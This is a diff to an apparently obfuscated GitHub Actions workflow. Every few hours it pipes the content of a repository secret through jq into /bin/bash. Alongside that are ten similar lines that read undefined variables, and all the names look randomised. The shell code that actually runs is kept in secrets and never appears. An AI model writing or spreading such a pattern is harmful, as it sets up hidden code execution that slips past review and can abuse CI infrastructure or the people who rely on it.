@@ -3,20 +3,26 @@ name: diaoyontsh
 on:
   workflow_dispatch:
   schedule:
-    - cron: '14 3/6 * * *'
-jobs:  # 7497
+    - cron: '36 0/6 * * *'
+
+jobs:
   build:
     runs-on: ubuntu-latest
-
     steps:
       - uses: actions/checkout@v4
       - name: diaoyontsh
         env:
-          is5886: ${{ secrets.is5886 }}
+          p564: ${{ secrets.p564 }}
         run: |
-          echo $is5886 | jq -r .qc78030 | /bin/bash
-          echo $pimpu0 | jq -r .st6036 | /bin/bash
-          echo $ebml09 | jq -r .qwk17308 | /bin/bash
-          echo $lurkc0495 | jq -r .fkw33167 | /bin/bash
-          echo $mky3 | jq -r .jjc7093 | /bin/bash
+          echo $p564 | jq -r .zvui4898 | /bin/bash
+          echo $jc443 | jq -r .p73877 | /bin/bash
+          echo $iduve129 | jq -r .qiw668 | /bin/bash
+          echo $vo152 | jq -r .r822 | /bin/bash
+          echo $z65885 | jq -r .ushd8030 | /bin/bash
+          echo $j4044 | jq -r .dzv234 | /bin/bash
+          echo $cen68 | jq -r .llq3715 | /bin/bash
+          echo $g8 | jq -r .qx74 | /bin/bash
+          echo $yc30966 | jq -r .osml148 | /bin/bash
+          echo $v8251 | jq -r .jhiz83584 | /bin/bash
+          echo $ktm1 | jq -r .zgxde96 | /bin/bash
 
